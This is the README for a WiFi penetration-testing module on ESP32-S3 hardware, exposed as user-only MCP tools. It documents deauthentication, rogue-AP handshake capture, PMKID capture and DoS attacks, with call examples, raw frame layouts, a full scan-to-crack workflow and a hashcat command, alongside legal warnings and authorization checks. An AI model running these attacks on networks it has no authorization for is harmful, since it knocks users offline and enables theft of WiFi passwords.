# WiFi Penetration Testing Module

**⚠️ LEGAL WARNING ⚠️**

This module is designed **EXCLUSIVELY** for:
- Authorized security audits on networks you own
- Penetration testing with explicit written authorization
- Educational purposes in controlled environments

**PROHIBITED**: Use on networks without owner authorization.  
**Unauthorized use may be illegal** in your jurisdiction.  
The user is solely responsible for compliance with local laws and regulations.

---

## Overview

The WiFi Penetration Testing module provides security auditing capabilities for WiFi networks through the MCP (Model Context Protocol) interface. It implements industry-standard WiFi security testing techniques on ESP32-S3 hardware.

### Supported Attacks

1. **Deauthentication (Deauth)** - Disconnect clients from target AP
2. **Rogue AP** - Create fake AP to capture WPA/WPA2 handshakes
3. **PMKID Capture** - Extract PMKID from RSN Information Elements
4. **Denial of Service (DoS)** - Combined deauth + beacon flood attack

### Features

- ✅ **Authorization Challenge-Response**: Requires physical device access
- ✅ **User-Only MCP Tools**: Not accessible to AI agents (human authorization required)
- ✅ **Rate Limiting**: Configurable frame injection rate (1-100 fps)
- ✅ **Automatic Timeouts**: Attacks auto-stop after configured duration
- ✅ **Capture Export**: PCAP (Wireshark) and HCCAPX (Hashcat) formats
- ✅ **Promiscuous Mode**: Full 802.11 frame capture during attacks
- ✅ **Complete Logging**: All attacks logged with timestamps

---

## Architecture

```
MCP Server (mcp_server.cc)
    └─> WifiPentestMcpTools (8 user-only tools)
            └─> WifiPentestManager (state machine & orchestrator)
                    ├─> WifiFrameInjector (802.11 frame injection)
                    ├─> WifiPacketAnalyzer (promiscuous capture)
                    └─> CaptureFormats/ (PCAP & HCCAPX export)
                        ├─> PcapWriter
                        └─> HccapxWriter
```

### Components

#### WifiPentestManager
- Centralized attack orchestration
- State machine: IDLE → READY → RUNNING → FINISHED/TIMEOUT/ERROR/ABORTED
- Authorization management with challenge-response
- Attack lifecycle management

#### WifiFrameInjector
- 802.11 raw frame injection using `esp_wifi_80211_tx()`
- Frame types: Deauth, Beacon, Probe Request/Response
- Sequence number management
- Configurable rate limiting

#### WifiPacketAnalyzer
- Promiscuous mode packet capture
- EAPoL handshake detection (4-way handshake)
- PMKID extraction from RSN IEs
- Circular packet buffer (1000 packets)

#### PcapWriter / HccapxWriter
- PCAP: Standard format for Wireshark analysis
- HCCAPX: Hashcat v4 format for password cracking

---

## Configuration

Enable via `idf.py menuconfig`:

```
Xiaozhi Assistant → WiFi Penetration Testing
```

### Options

- **Enable WiFi Penetration Testing Tools** (default: OFF)  
  Master toggle for the entire module.

- **Maximum Capture Buffer Size** (default: 512 KB, range: 128-2048 KB)  
  Packet capture buffer. Allocated only during active attacks.

- **Authorization Timeout** (default: 300 seconds, range: 60-3600 seconds)  
  Time window for entering authorization code displayed on LCD.

- **Maximum Frame Rate** (default: 50 fps, range: 10-100 fps)  
  Upper limit for frame injection rate.

---

## MCP Tools Usage

### 1. Scan Networks

Discover available WiFi targets.

```python
result = await self.wifi_pentest.scan_targets()
```

**Returns**:
```json
{
  "networks": [
    {
      "ssid": "TestNetwork",
      "bssid": "AA:BB:CC:DD:EE:FF",
      "channel": 6,
      "rssi": -45,
      "auth_mode": "WPA2_PSK"
    }
  ]
}
```

---

### 2. Deauth Attack

Send deauthentication frames to disconnect clients.

```python
result = await self.wifi_pentest.deauth_attack(
    target_bssid="AA:BB:CC:DD:EE:FF",
    channel=6,
    duration_seconds=10,
    frame_rate=10,
    authorization_code="A3F7B2C9"  # Code shown on device LCD
)
```

**Parameters**:
- `target_bssid` (string, required): MAC address of target AP
- `target_ssid` (string, optional): SSID for verification
- `channel` (integer, default=1): WiFi channel (1-13)
- `duration_seconds` (integer, default=10, range: 5-300): Attack duration
- `frame_rate` (integer, default=10, range: 1-100): Frames per second
- `authorization_code` (string, required): Code from device LCD

**Returns**:
```json
{
  "status": "finished",
  "frames_sent": 4500,
  "duration": 10,
  "errors": 0,
  "message": "Deauth attack finished"
}
```

**Authorization Flow**:
1. Call without `authorization_code` parameter
2. Device generates random 8-digit hex code displayed on LCD
3. User physically reads code from device screen
4. Call again with `authorization_code` parameter
5. Attack executes if code is valid and not expired

---

### 3. Rogue AP Attack

Create fake AP to capture WPA/WPA2 handshakes.

```python
result = await self.wifi_pentest.rogue_ap(
    target_bssid="AA:BB:CC:DD:EE:FF",
    target_ssid="TestNetwork",
    channel=6,
    duration_seconds=60,
    authorization_code="A3F7B2C9"
)
```

**Parameters**:
- `target_bssid` (string, required): BSSID to clone
- `target_ssid` (string, required): SSID to clone
- `channel` (integer, required, range: 1-13): WiFi channel
- `duration_seconds` (integer, default=60, range: 10-600): Capture duration
- `frame_rate` (integer, default=10): Beacon frame rate
- `authorization_code` (string, required): Authorization code

**Returns**:
```json
{
  "status": "finished",
  "handshakes_captured": 2,
  "pcap_size_bytes": 45678,
  "export_available": true,
  "message": "Rogue AP attack finished"
}
```

---

### 4. PMKID Capture

Extract PMKID from RSN Information Elements (passive attack).

```python
result = await self.wifi_pentest.pmkid_capture(
    target_bssid="AA:BB:CC:DD:EE:FF",
    channel=6,
    duration_seconds=30,
    authorization_code="A3F7B2C9"
)
```

**Parameters**:
- `target_bssid` (string, required): Target AP BSSID
- `target_ssid` (string, optional): SSID for verification
- `channel` (integer, required, range: 1-13): WiFi channel
- `duration_seconds` (integer, default=30, range: 10-300): Capture duration
- `authorization_code` (string, required): Authorization code

**Returns**:
```json
{
  "status": "finished",
  "pmkid_captured": true,
  "pmkid": "aabbccdd1122334455667788...",
  "hccapx_available": true,
  "message": "PMKID captured successfully"
}
```

---

### 5. DoS Attack

Combined denial of service (deauth + beacon flood).

```python
result = await self.wifi_pentest.dos_attack(
    target_bssid="AA:BB:CC:DD:EE:FF",
    channel=6,
    duration_seconds=20,
    authorization_code="A3F7B2C9"
)
```

**Parameters**:
- `target_bssid` (string, required): Target AP BSSID
- `channel` (integer, default=1): WiFi channel
- `duration_seconds` (integer, default=20, range: 5-300): Attack duration
- `frame_rate` (integer, default=50): Frame injection rate
- `authorization_code` (string, required): Authorization code

---

### 6. Stop Attack

Immediately abort running attack.

```python
result = await self.wifi_pentest.stop_attack()
```

**Returns**:
```json
{
  "status": "stopped",
  "message": "Attack stopped successfully"
}
```

---

### 7. Export Capture

Export captured packets in PCAP or HCCAPX format.

```python
# Export as PCAP (for Wireshark)
result = await self.wifi_pentest.export_capture(
    format="pcap",
    base64_encode=True
)

# Export as HCCAPX (for Hashcat)
result = await self.wifi_pentest.export_capture(
    format="hccapx",
    base64_encode=True
)
```

**Parameters**:
- `format` (string, required): "pcap" or "hccapx"
- `base64_encode` (boolean, default=true): Encode output as base64

**Returns**:
```json
{
  "format": "pcap",
  "data_base64": "AABBCCDD...",
  "size_bytes": 45678,
  "message": "PCAP exported successfully"
}
```

**Decoding**:
```bash
# Save base64 string to file
echo "AABBCCDD..." > capture.pcap.b64

# Decode
base64 -d capture.pcap.b64 > capture.pcap

# Open in Wireshark
wireshark capture.pcap
```

**Hashcat Usage**:
```bash
# Decode HCCAPX
base64 -d capture.hccapx.b64 > capture.hccapx

# Crack with Hashcat
hashcat -m 22000 capture.hccapx wordlist.txt
```

---

### 8. Get Status

Retrieve real-time attack status and statistics.

```python
result = await self.wifi_pentest.get_status()
```

**Returns**:
```json
{
  "state": "running",
  "attack_type": "deauth",
  "elapsed_seconds": 5,
  "frames_sent": 500,
  "packets_captured": 123,
  "handshakes_captured": 0,
  "pmkid_captured": false
}
```

---

## Example Workflow

### Complete Security Audit

```python
# 1. Discover targets
scan = await self.wifi_pentest.scan_targets()
target = scan["networks"][0]

print(f"Target: {target['ssid']} ({target['bssid']}) on channel {target['channel']}")

# 2. Request authorization
deauth_result = await self.wifi_pentest.deauth_attack(
    target_bssid=target["bssid"],
    channel=target["channel"]
)

# Device displays: "Auth Code: A3F7B2C9"
print(f"Authorization code: {deauth_result['authorization_code']}")

# 3. Execute deauth attack (after reading code from LCD)
deauth_result = await self.wifi_pentest.deauth_attack(
    target_bssid=target["bssid"],
    channel=target["channel"],
    duration_seconds=10,
    frame_rate=10,
    authorization_code="A3F7B2C9"  # Code from LCD
)

print(f"Deauth: {deauth_result['status']}, {deauth_result['frames_sent']} frames sent")

# 4. Capture handshake with rogue AP
rogue_result = await self.wifi_pentest.rogue_ap(
    target_bssid=target["bssid"],
    target_ssid=target["ssid"],
    channel=target["channel"],
    duration_seconds=60,
    authorization_code="..."  # New code required
)

print(f"Handshakes captured: {rogue_result['handshakes_captured']}")

# 5. Export for offline cracking
pcap = await self.wifi_pentest.export_capture(format="pcap")
hccapx = await self.wifi_pentest.export_capture(format="hccapx")

# Save to files
import base64
with open("capture.pcap", "wb") as f:
    f.write(base64.b64decode(pcap["data_base64"]))

with open("capture.hccapx", "wb") as f:
    f.write(base64.b64decode(hccapx["data_base64"]))

print("Capture files saved!")
```

---

## Security Measures

1. **Authorization Challenge-Response**  
   - Random 8-digit hex code generated per attack
   - Displayed on device LCD (requires physical access)
   - 5-minute expiration timeout
   - One-time use (new code required for each attack)

2. **User-Only MCP Tools**  
   - Tools registered as `RegisterUserOnlyTool()`
   - Not accessible to AI agents (Claude cannot invoke autonomously)
   - Human authorization required for all attacks

3. **Rate Limiting**  
   - Configurable frame injection rate (1-100 fps)
   - Prevents network flooding
   - Ensures stable ESP32 operation

4. **Automatic Timeouts**  
   - All attacks have maximum duration (5-600 seconds)
   - System auto-stops attacks on timeout
   - Prevents runaway attacks

5. **Graceful Abort**  
   - Attacks can be stopped at any time
   - Clean WiFi state restoration
   - No dangling processes

6. **Complete Logging**  
   - All attacks logged with timestamps
   - BSSID, SSID, duration, frame count recorded
   - Facilitates audit trails

---

## Resource Usage

### Flash Memory
- Core code: ~35 KB
- Data structures: ~5 KB
- **Total: ~40 KB**

### RAM
- Manager + injector + analyzer: ~5 KB (persistent)
- Packet capture buffer: 512 KB (default, configurable)
- Attack task stack: 4 KB
- **Total peak: ~521 KB** (only during active attack)

### CPU Usage
- Idle: 0%
- Deauth attack (50 fps): ~15%
- Promiscuous capture: ~5%
- **Total peak: ~20%**

---

## Technical Details

### 802.11 Frame Injection

**Deauth Frame** (26 bytes):
```c
struct DeauthFrame {
    uint8_t frame_control[2];    // 0xC0, 0x00
    uint8_t duration[2];         // 0x00, 0x00
    uint8_t destination[6];      // Client MAC or FF:FF:FF:FF:FF:FF
    uint8_t source[6];           // Target BSSID
    uint8_t bssid[6];            // Target BSSID
    uint8_t sequence[2];         // Sequence number (auto-incremented)
    uint8_t reason_code[2];      // 0x07, 0x00 (Class 3 frame)
};
```

**Beacon Frame** (variable length):
- Frame Control: 0x80, 0x00 (Management: Beacon)
- Destination: FF:FF:FF:FF:FF:FF (broadcast)
- SSID IE (Tag 0)
- Supported Rates IE (Tag 1)
- DS Parameter Set IE (Tag 3)

### EAPoL Handshake Detection

**4-Way Handshake**:
1. MSG1 (AP → Client): ANonce
2. MSG2 (Client → AP): SNonce + MIC
3. MSG3 (AP → Client): GTK + MIC
4. MSG4 (Client → AP): ACK + MIC

**Detection Logic**:
```c
bool IsEapolHandshake(const uint8_t* frame, size_t length) {
    // Check EtherType 0x888E at offset 30-31
    if (frame[30] != 0x88 || frame[31] != 0x8E) return false;
    
    // Extract Key Information field
    uint16_t key_info = (frame[37] << 8) | frame[38];
    
    // Verify Key MIC bit (0x0100)
    return (key_info & 0x0100) != 0;
}
```

### PCAP Format

**Global Header** (24 bytes):
```c
struct PcapGlobalHeader {
    uint32_t magic = 0xa1b2c3d4;
    uint16_t version_major = 2;
    uint16_t version_minor = 4;
    int32_t  thiszone = 0;
    uint32_t sigfigs = 0;
    uint32_t snaplen = 65535;
    uint32_t network = 105;  // IEEE 802.11
};
```

**Packet Header** (16 bytes per packet):
```c
struct PcapPacketHeader {
    uint32_t ts_sec;      // Timestamp seconds
    uint32_t ts_usec;     // Timestamp microseconds
    uint32_t incl_len;    // Packet length
    uint32_t orig_len;    // Original length
};
```

### HCCAPX Format

**Handshake Record** (393 bytes):
```c
struct HccapxRecord {
    uint32_t signature = 0x58504348;  // 'HCPX'
    uint32_t version = 4;
    uint8_t  message_pair;  // Bitmask: M1=0x80, M2=0x40, M3=0x20, M4=0x10
    uint8_t  essid_len;
    uint8_t  essid[32];
    uint8_t  keyver;        // 1=WPA, 2=WPA2
    uint8_t  keymic[16];
    uint8_t  mac_ap[6];
    uint8_t  nonce_ap[32];
    uint8_t  mac_sta[6];
    uint8_t  nonce_sta[32];
    uint16_t eapol_len;
    uint8_t  eapol[256];
};
```

**PMKID Record** (64 bytes):
```c
struct PmkidRecord {
    uint32_t signature = 0x58504348;
    uint32_t version = 4;
    uint8_t  pmkid[16];
    uint8_t  mac_ap[6];
    uint8_t  mac_sta[6];
    uint8_t  essid_len;
    uint8_t  essid[32];
};
```

---

## Troubleshooting

### "Authorization failed: incorrect code"
- Ensure code is entered exactly as displayed on LCD
- Check that code hasn't expired (5 minute timeout)
- Codes are case-insensitive but must match exactly

### "No handshake captured"
- Increase `duration_seconds` (try 120-300 seconds)
- Ensure client is actively connecting during rogue AP attack
- Try deauth attack first to force reconnection
- Verify correct channel is used

### "PMKID not found"
- Not all APs support PMKID (mainly WPA2 only)
- Increase `duration_seconds` to allow more beacon frames
- Ensure AP is actually broadcasting (some hide SSID)

### "Frame injection failed"
- Verify ESP32-S3 WiFi is functional
- Check that no other WiFi operations are active
- Ensure promiscuous mode is supported (ESP32-S3 only)

### "Capture buffer overflow"
- Increase `CONFIG_WIFI_PENTEST_MAX_CAPTURE_SIZE` in menuconfig
- Reduce attack duration for high-traffic networks
- Export captures more frequently

---

## Legal & Ethical Use

### Authorized Use Cases
✅ Security audits on your own WiFi networks  
✅ Penetration testing with signed authorization letters  
✅ Educational labs in controlled environments (universities, bootcamps)  
✅ Security research with institutional ethics approval  
✅ Defensive security testing with management approval  

### Prohibited Use Cases
❌ Attacking public WiFi networks  
❌ Unauthorized testing of employer/client networks  
❌ Password cracking without network owner consent  
❌ Denial of service attacks on production systems  
❌ Any malicious or unethical usage  

### Legal Considerations
- **United States**: Computer Fraud and Abuse Act (CFAA), Wiretap Act
- **European Union**: Computer Misuse Act, GDPR
- **United Kingdom**: Computer Misuse Act 1990
- **Australia**: Cybercrime Act 2001
- **Canada**: Criminal Code Section 342.1

**Penalties**: Unauthorized access can result in fines up to $250,000 and/or imprisonment up to 10 years (varies by jurisdiction).

---

## References

- [ESP32 WiFi Driver](https://docs.espressif.com/projects/esp-idf/en/latest/esp32/api-reference/network/esp_wifi.html)
- [IEEE 802.11 Standard](https://standards.ieee.org/standard/802_11-2020.html)
- [PCAP Format Specification](https://wiki.wireshark.org/Development/LibpcapFileFormat)
- [Hashcat HCCAPX Format](https://hashcat.net/wiki/doku.php?id=hccapx)
- [WPA/WPA2 4-Way Handshake](https://en.wikipedia.org/wiki/IEEE_802.11i-2004#The_four-way_handshake)

---

## Support & Feedback

For bugs, feature requests, or security concerns:
- GitHub Issues: [xiaozhi-esp32/issues](https://github.com/anthropics/xiaozhi-esp32/issues)
- Email: security@xiaozhi.ai (for responsible disclosure)

**Responsible Disclosure**: If you discover a security vulnerability in this module, please report it privately before public disclosure.

---

## License

Copyright 2025 XiaoZhi ESP32 Project

This module is provided for authorized security testing purposes only.
Unauthorized use is strictly prohibited and may be illegal.

The authors and contributors are not responsible for misuse of this software.
